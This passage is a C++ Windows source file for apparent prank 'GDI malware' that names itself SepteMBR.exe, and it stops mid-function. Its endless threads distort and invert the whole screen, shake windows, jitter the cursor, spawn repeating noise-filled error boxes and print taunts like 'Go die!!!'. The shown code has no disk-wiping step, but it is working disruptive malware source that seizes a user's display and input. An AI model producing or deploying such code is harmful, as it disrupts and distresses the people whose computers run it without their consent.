﻿#pragma warning(disable: 4995)
#pragma comment(lib, "Dwmapi.lib")
#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<fstream>
#include<windef.h>
#include<memory>
#include<iosfwd>
#include<dwmapi.h>
#include"resource.h"
#include"aboutn17pro3426.h"
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")//use lambdaexec Neoarsphenamine\def.h
#define RndRGB RGB(rand() % 255, rand() % 255, rand() % 255)
#pragma optimize("", off)//disable "t>>t" return 0
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
namespace Colors {
    //These HSL functions was made by Wipet, credits to him!(write by pankoza)
    //And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant) {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
    int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
    XFORM xform;
    if (Angle != 0) {
        double fangle = (double)Angle / 180. * 3.1415926;
        xform.eM11 = (float)cos(fangle);
        xform.eM12 = (float)sin(fangle);
        xform.eM21 = (float)-sin(fangle);
        xform.eM22 = (float)cos(fangle);
        xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
        xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
        SetWorldTransform(hdc, &xform);
    }
    return nGraphicsMode;
}
int red, green, blue; bool ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
#define PI 3.14159265358979323846
LPCWSTR GetRandomChar(int length) {
    wchar_t* strRandom = new wchar_t[length + 1];
    for (int i = 0; i < length; i++) {
        strRandom[i] = (rand() % 256) + 1024;
    }
    strRandom[length] = L'\0';
    return strRandom;
}
VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x + y, x - y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
HANDLE mbm = NULL;
BOOL g_bStopMG = FALSE;
VOID WINAPI MG(LPVOID lpParam) {
    HWND window = (HWND)lpParam;
    RECT windowRect;
    GetWindowRect(window, &windowRect);
    int w = windowRect.right - windowRect.left;
    int h = windowRect.bottom - windowRect.top;
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    bmi.bmiHeader.biCompression = BI_RGB;
    PRGBQUAD prgbScreen = NULL;
    HDC hdc = GetDC(window);
    HDC hcdc = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&prgbScreen, NULL, 0);
    HBITMAP hOld = (HBITMAP)SelectObject(hcdc, hBitmap);
    while (!g_bStopMG && IsWindow(window)) {
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int a = rand() % 255;
                prgbScreen[x + w * y].r = a;
                prgbScreen[x + w * y].g = a;
                prgbScreen[x + w * y].b = a;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        Sleep(30);
    }
    SelectObject(hcdc, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hcdc);
    ReleaseDC(window, hdc);
    mbm = NULL;
    g_bStopMG = FALSE;
    ExitThread(0);
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE) {
        HWND msgboxHWND = (HWND)wParam;
        if (mbm == NULL) {
            g_bStopMG = FALSE;
            mbm = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MG, msgboxHWND, 0, NULL);
        }
    }
    if (nCode == HCBT_DESTROYWND) {
        g_bStopMG = TRUE;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
DWORD WINAPI Window1_Msgbox(LPVOID lpParam) {
    while (TRUE) {
        HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, NULL, GetCurrentThreadId());
        MessageBoxA(NULL, "jinum dddss'x sbjkdl.", "pc crdbbs xx!!", MB_ICONERROR | MB_ABORTRETRYIGNORE);
        UnhookWindowsHookEx(hook);
        g_bStopMG = TRUE;
        Sleep(100);
    }
}
DWORD WINAPI Window2_Shake(LPVOID lpParam) {
    while (1 == 1) {
        HWND hwnd = GetForegroundWindow();
        RECT r;
        GetWindowRect(hwnd, &r);
        int rnd = rand() % 10 - 5;
        if (rand() % 2 == 0) SetWindowPos(hwnd, 0, r.left + rnd, r.top, 0, 0, SWP_NOSIZE);
        else SetWindowPos(hwnd, 0, r.left, r.top + rnd, 0, 0, SWP_NOSIZE);
        POINT p;
        GetCursorPos(&p);
        p.x += rand() % 4 - 2;
        p.y += rand() % 4 - 2;
        SetCursorPos(p.x, p.y);
        Sleep(99);
    }
}
DWORD WINAPI Shader1_NoName1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += x & y | (i & x) - x + 3 / (y + 1);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader2_NoName2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb = x - y * i + 4 | 4 & i;
            rgbquad[i].rgb += (x | y) * t;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader3_NoName3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += (x | y) - t;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        SetBkMode(hdc, 0);
        HFONT hFont = CreateFontA(200, 0, 0, FW_THIN, 0, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
        HBITMAP hBitmap = (HBITMAP)SelectObject(hdc, hFont);
        SetTextColor(hdc, RndRGB);
        LPCSTR texts[] = { "L0S3R","What you want to say?","L0L","78915418813141145141919810","Go die!!!","Still using this computer?","This equipment is useless.","by uiui","SepteMBR.exe" };
        int rrr = rand() % 9; TextOutA(hdc, rand() % w, rand() % h, texts[rrr], strlen(texts[rrr]));
        SelectObject(hdc, hBitmap);
        DeleteObject(hFont);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader4_NoName4(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].r += GetRValue(y - x + w - y * x);
            rgbquad[i].g += GetGValue(y - x + w - y * x);
            rgbquad[i].b += GetBValue(y - x + w - y * x);
            rgbquad[i].rgb -= x ^ y;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
struct Point3D {
    float x, y, z;
};
Point3D RotatePoint(Point3D p, float x, float y, float z) {
    float cosX = cos(x), sinX = sin(x);
    float cosY = cos(y), sinY = sin(y);
    float cosZ = cos(z), sinZ = sin(z);
    float y2 = p.y * cosX - p.z * sinX;
    float z2 = p.y * sinX + p.z * cosX;
    p.y = y2;
    p.z = z2;
    float x2 = p.x * cosY + p.z * sinY;
    z2 = -p.x * sinY + p.z * cosY;
    p.x = x2;
    p.z = z2;
    x2 = p.x * cosZ - p.y * sinZ;
    y2 = p.x * sinZ + p.y * cosZ;
    p.x = x2;
    p.y = y2;
    return(p);
}
DWORD WINAPI Payload1_Icons(LPVOID lpParam) {
    POINT p; int radius = 100, angle = 0, count = 0, x = 0, y = 0, signX, signY;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    float angle2 = 0.0f;
    while (true) {
        if (x <= 0)signX = 1;
        if (y <= 0)signY = 1;
        if (x >= w)signX = -1;
        if (y >= h)signY = -1;
        x += signX;
        y += signY;
        p.x = x;
        p.y = y;
        int x = p.x + (radius * cos(angle * 3.1415926 / 14)), y = p.y + (radius * sin(angle * 3.1415926 / 14));
        Point3D p2 = { x,y,0 };
        x += RotatePoint(p2, angle2, angle2, angle2).x / 4;
        y += RotatePoint(p2, angle2, angle2, angle2).y / 4;
        HICON hIcon = LoadIcon(0, IDI_WINLOGO);
        HDC hdc = GetDC(0);
        DrawIcon(hdc, x, y, hIcon);
        ReleaseDC(0, hdc);
        DeleteObject(hIcon);
        DeleteDC(hdc);
        angle++;
        if (count == 10) {
            count = 0;
            angle2 += 0.01;
            Sleep(10);
        }
        else {
            count++;
        }
    };
}
DWORD WINAPI Shader5_NoName5(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1){
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (x | y - x & y / (x + 1)) | i *(x * y);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                hslcolor.s = fx;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(5);
    }
}
DWORD WINAPI Payload2_Icons2(LPVOID lpParam) {
    int x = 0, y = 0, signX, signY, w = GetSystemMetrics(0), h = GetSystemMetrics(1), size = 200;
    for (;;) {
        HDC hdc = GetDC(0);
        if (x <= 0)signX = 10;
        if (y <= 0)signY = 10;
        if (x + size >= w)signX = -10;
        if (y + size >= h)signY = -10;
        HICON hIcon = LoadIcon(0, IDI_WARNING);
        DrawIcon(hdc, x, y, hIcon);
        DrawIcon(hdc, x, y + size, hIcon);
        DrawIcon(hdc, x + size, y, hIcon);
        DrawIcon(hdc, x + size, y + size, hIcon);
        DestroyIcon(hIcon);
        for (int i = 0; i < 90; i++) {
            HICON hIcon = LoadIcon(0, lpIconNames[rand()%6]);
            DrawIcon(hdc, x + rand() % size, y + rand() % size, hIcon);
            DestroyIcon(hIcon);
        }
        ReleaseDC(0, hdc);
        DestroyIcon(hIcon);
        x += signX;
        y += signY;
        Sleep(10);
    }
}
DWORD WINAPI Shader6_NoName6(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = i + x | i + y * i + y & i + x;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                hslcolor.s = fx;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(5);
    }
}
DWORD WINAPI Shader7_NoName7(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += 100 * sin((x ^ y) * PI / 180.f);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader8_NoName8(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += 100 * tan((x | y) * PI / 180.f);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader9_NoName9(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb -= 1600 + sin(tan(1 - x * y)) * 500;
        }
        StretchBlt(hcdc, 10, 10, w - 20, h - 20, hcdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, -10, -10, w + 20, h + 20, hcdc, 0, 0, w, h, SRCCOPY);
        BitBlt(hcdc, rand() % 10 - 5, rand() % 20 - 10, w, h, hcdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader10_NoName10(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB};
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int a = rand() % 255;
            rgbquad[i].rgb = RGB(a, a, a);
        }
        int a = rand() % 100;
        SetStretchBltMode(hcdc, COLORONCOLOR);
        StretchBlt(hcdc, a, a, w - (a * 2), h - (a * 2), hcdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hcdc, -a, -a, w + (a * 2), h + (a * 2), hcdc, a, a, w - (a * 10), h - (a * 10), SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader11_NoName11(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xSize = h / 10, ySize = 9;;
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += sqrt(x | y - y) - y + x + 78;
        }		
        int i;
        for (i = 0; i < h * 2; i++) {
            int wave = sin(i / ((float)xSize) * PI) * (ySize);
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, wave, SRCCOPY);
        }
        for (i = 0; i < w * 2; i++) {
            int wave = sin(i / ((float)xSize) * PI) * (ySize);
            BitBlt(hcdc, 0, i, w, 1, hcdc, wave, i, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload3_Rotate(LPVOID lpParam) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hdcr = GetDC(0);
        POINT p = { rand() % w,rand() % h };
        RotateDC(hdc, rand() % 90 - 45, p);
        BitBlt(hdc, rand() % 500, rand() % 500, w, h, hdcr, 0, 0, NOTSRCERASE);
        HICON icon = LoadIcon(0, lpIconNames[rand() % 6]);
        DrawIconEx(hdcr, rand() % w, rand() % h, icon, rand() % w, rand() % h, NULL, NULL, DI_NORMAL);
        DestroyIcon(icon);
        HCURSOR cursor = LoadCursor(0, lpCursorNames[rand() % 16]);
        DrawIconEx(hdcr, rand() % w, rand() % h, cursor, rand() % w, rand() % h, NULL, NULL, DI_NORMAL);
        DestroyIcon(cursor);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdcr);
        Sleep(100);
    }
}
DWORD WINAPI Shader12_NoName12(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += sqrt(x | y - y) - y + x + 78;
            rgbquad[i].rgb += 7891;
        }
        POINT ps[3];
        ps[0].x = 0, ps[0].y = h / 8;
        ps[1].x = w - (w / 8), ps[1].y = 0;
        ps[2].x = w / 8, ps[2].y = h;
        PlgBlt(hdc, ps, hcdc, 0, 0, w, h, 0, 0, 0);
        HBRUSH hBrush = CreateSolidBrush(RndRGB);
        HBITMAP old = (HBITMAP)SelectObject(hdc, hBrush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        SelectObject(hdc, old);
        DeleteObject(hBrush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader13_NoName13(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += x - y + x & y ^ x << y;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload4_Icons3(LPVOID lpParam) {
    for (;;) {
        int size = 32 + rand() % 118;
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HICON ico = LoadIcon(0, lpIconNames[rand() % 6]);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, size, size, NULL, NULL, DI_NORMAL);
        DestroyIcon(ico);
        ico = LoadCursor(0, lpCursorNames[rand() % 16]);
        DrawIconEx(hdc, rand() % w, rand() % h, ico, size, size, NULL, NULL, DI_NORMAL);
        DestroyIcon(ico);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader14_NoName14(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbquad[i].rgb += (RGB(x, y, i) & RGB(i, y, x) / (x + 1)) * RGB(i, i, i);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader15_NoName15(LPVOID lpParam) {
